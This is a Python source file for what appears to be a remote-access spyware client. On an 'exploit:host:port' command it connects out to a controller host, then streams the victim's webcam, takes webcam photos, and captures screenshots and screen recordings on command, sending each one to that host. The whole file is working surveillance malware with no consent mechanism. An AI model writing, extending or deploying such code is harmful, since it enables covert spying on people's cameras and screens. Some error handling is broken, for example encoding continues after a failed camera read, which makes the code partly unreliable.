import socket
import struct
import pickle
import threading
from PIL import ImageGrab
import cv2
import numpy as np
import io

class Client:
    stop_event = threading.Event()

    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        try:
            self.listen()
        finally:
            self.socket.close()

    # Modules
    def stream_webcam(self):
        cap = cv2.VideoCapture(0)
        while not self.stop_event.is_set():
            ret, frame = cap.read()
            if not ret:
                self.client.send(b'error')
                break

            _, buffer = cv2.imencode('.jpg', frame)
            data = pickle.dumps(buffer)
            self.client.sendall(struct.pack('!I', len(data)) + data)

        cap.release()
        cv2.destroyAllWindows()

    def take_picture(self):
        cap = cv2.VideoCapture(0)
        if not self.stop_event.is_set():
            ret, frame = cap.read()
            if not ret:
                self.client.send(b'error')

            _, buffer = cv2.imencode('.jpg', frame)
            data = pickle.dumps(buffer)
            self.client.sendall(struct.pack('!I', len(data)) + data)

        self.stop_event.set()
        cap.release()

    def screenshot(self):
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        data = buffer.getvalue()
        self.client.sendall(struct.pack('!I', len(data)) + data)

    def screen_recording(self):
        while not self.stop_event.is_set():
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            _, buffer = cv2.imencode('.jpg', frame)
            data = pickle.dumps(buffer)
            data = struct.pack('!I', len(data)) + data
            self.client.sendall(data)

        self.stop_event.set()
        cv2.destroyAllWindows()

    def connect(self, addr, port):
        self.socket_cmd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket_cmd.connect((addr, port))
        except ConnectionRefusedError:
            pass

        print('Connected...')
        while True:
            data = self.socket_cmd.recv(1024).decode()

            if not data:
                print('Client disconnected...')
                break
            if data == 'webcam':
                self.stop_event.clear()
                threading.Thread(target=self.stream_webcam, daemon=True).start()
            if data == 'picture':
                self.stop_event.clear()
                threading.Thread(target=self.take_picture, daemon=True).start()
            if data == 'screenshot':
                threading.Thread(target=self.screenshot, daemon=True).start()
            if data == 'screen recording':
                self.stop_event.clear()
                threading.Thread(target=self.screen_recording, daemon=True).start()
            if data == 'close event':
                self.stop_event.set()

    def listen(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.addr, self.port))
        self.socket.listen(3)

        while True:
            self.client, self.address = self.socket.accept()
            data = self.client.recv(1024).decode()
            if data.startswith('exploit:'):
                address = data.split(':')
                self.connect(address[1], int(address[2]))

if __name__ == '__main__':
    addr = '127.0.0.1'
    port = 9999
    client = Client(addr, port)